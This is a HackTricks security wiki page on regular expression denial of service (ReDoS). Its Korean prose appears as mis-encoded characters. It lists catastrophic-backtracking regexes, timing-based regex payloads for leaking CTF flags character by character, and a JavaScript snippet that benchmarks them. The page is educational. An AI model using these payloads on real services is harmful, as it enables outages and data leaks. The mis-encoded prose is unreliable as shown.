# ì •ê·œ í‘œí˜„ì‹ ì„œë¹„ìŠ¤ ê±°ë¶€ - ReDoS

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

# ì •ê·œ í‘œí˜„ì‹ ì„œë¹„ìŠ¤ ê±°ë¶€ (ReDoS)

**ì •ê·œ í‘œí˜„ì‹ ì„œë¹„ìŠ¤ ê±°ë¶€ (ReDoS)**ëŠ” ëˆ„êµ°ê°€ê°€ ì •ê·œ í‘œí˜„ì‹(í…ìŠ¤íŠ¸ì—ì„œ íŒ¨í„´ì„ ê²€ìƒ‰í•˜ê³  ì¼ì¹˜ì‹œí‚¤ëŠ” ë°©ë²•)ì˜ ì‘ë™ ë°©ì‹ì—ì„œì˜ ì•½ì ì„ ì´ìš©í•  ë•Œ ë°œìƒí•©ë‹ˆë‹¤. ë•Œë•Œë¡œ ì •ê·œ í‘œí˜„ì‹ì„ ì‚¬ìš©í•  ë•Œ, ì²˜ë¦¬í•˜ëŠ” í…ìŠ¤íŠ¸ ì¡°ê°ì´ ì»¤ì§ˆìˆ˜ë¡ ë§¤ìš° ëŠë ¤ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ëŠë¦¼ì€ í…ìŠ¤íŠ¸ í¬ê¸°ê°€ ì¡°ê¸ˆë§Œ ì¦ê°€í•´ë„ ë§¤ìš° ë¹ ë¥´ê²Œ ì¦ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ìëŠ” ì´ ë¬¸ì œë¥¼ ì´ìš©í•˜ì—¬ ì •ê·œ í‘œí˜„ì‹ì„ ì‚¬ìš©í•˜ëŠ” í”„ë¡œê·¸ë¨ì´ ì˜¤ë«ë™ì•ˆ ì œëŒ€ë¡œ ì‘ë™í•˜ì§€ ì•Šë„ë¡ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.


## ë¬¸ì œì˜ ì •ê·œ í‘œí˜„ì‹ ë‹¨ìˆœ ì•Œê³ ë¦¬ì¦˜

**ìì„¸í•œ ë‚´ìš©ì€ [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.**


## ì•…ì„± ì •ê·œ í‘œí˜„ì‹ <a href="#evil-regexes" id="evil-regexes"></a>

ì•…ì„± ì •ê·œ í‘œí˜„ì‹ íŒ¨í„´ì€ **ì¡°ì‘ëœ ì…ë ¥ì— ê°‡í˜€ ì„œë¹„ìŠ¤ ê±°ë¶€ë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ ìˆëŠ”** íŒ¨í„´ì…ë‹ˆë‹¤. ì•…ì„± ì •ê·œ í‘œí˜„ì‹ íŒ¨í„´ì€ ì¼ë°˜ì ìœ¼ë¡œ ë°˜ë³µì´ ìˆëŠ” ê·¸ë£¹í™”ì™€ ë°˜ë³µ ë˜ëŠ” ê²¹ì¹˜ëŠ” ë¶€ë¶„ì´ ìˆëŠ” ëŒ€ì²´ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. ì•…ì„± íŒ¨í„´ì˜ ëª‡ ê°€ì§€ ì˜ˆëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* (a+)+
* ([a-zA-Z]+)*
* (a|aa)+
* (a|a?)+
* (.*a){x} for x > 10

ì´ ëª¨ë“  íŒ¨í„´ì€ ì…ë ¥ `aaaaaaaaaaaaaaaaaaaaaaaa!`ì— ì·¨ì•½í•©ë‹ˆë‹¤.

## ReDoS í˜ì´ë¡œë“œ

### ReDoSë¥¼ í†µí•œ ë¬¸ìì—´ ìœ ì¶œ

CTF(ë˜ëŠ” ë²„ê·¸ ë°”ìš´í‹°)ì—ì„œ ë¯¼ê°í•œ ì •ë³´(í”Œë˜ê·¸)ê°€ ì¼ì¹˜í•˜ëŠ” **ì •ê·œ í‘œí˜„ì‹ì„ ì œì–´í•  ìˆ˜ ìˆë‹¤ë©´** ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ **ì •ê·œ í‘œí˜„ì‹ì´ ì¼ì¹˜í•  ë•Œ í˜ì´ì§€ê°€ ë©ˆì¶”ê²Œ(íƒ€ì„ì•„ì›ƒ ë˜ëŠ” ë” ê¸´ ì²˜ë¦¬ ì‹œê°„)** ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ ë¬¸ìì—´ì„ **ë¬¸ì ë‹¨ìœ„ë¡œ ìœ ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* [**ì´ ê²Œì‹œë¬¼**](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)ì—ì„œ ì´ ReDoS ê·œì¹™ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: `^(?=<flag>)((.*)*)*salt$`
* ì˜ˆ: `^(?=HTB{sOmE_flÂ§NÂ§)((.*)*)*salt$`
* [**ì´ ì‘ì„±ë¬¼**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)ì—ì„œ ì´ íŒ¨í„´ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: `<flag>(((((((.*)*)*)*)*)*)*)!`
* [**ì´ ì‘ì„±ë¬¼**](https://ctftime.org/writeup/25869)ì—ì„œëŠ”: `^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`ë¥¼ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤.

### ReDoS ì…ë ¥ ë° ì •ê·œ í‘œí˜„ì‹ ì œì–´

ë‹¤ìŒì€ **ì…ë ¥**ê³¼ **ì •ê·œ í‘œí˜„ì‹**ì„ ëª¨ë‘ **ì œì–´í•˜ëŠ”** ReDoS ì˜ˆì œì…ë‹ˆë‹¤:
```javascript
function check_time_regexp(regexp, text){
var t0 = new Date().getTime();;
new RegExp(regexp).test(text);
var t1 = new Date().getTime();;
console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
"(a|a?)+$",
"(\\w*)+$",   //Generic
"(a*)+$",
"(.*a){100}$",
"([a-zA-Z]+)*$", //Generic
"(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## ë„êµ¬

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

## ì°¸ê³ ìë£Œ
* [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
* [https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)
* [https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)
* [https://ctftime.org/writeup/25869](https://ctftime.org/writeup/25869)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
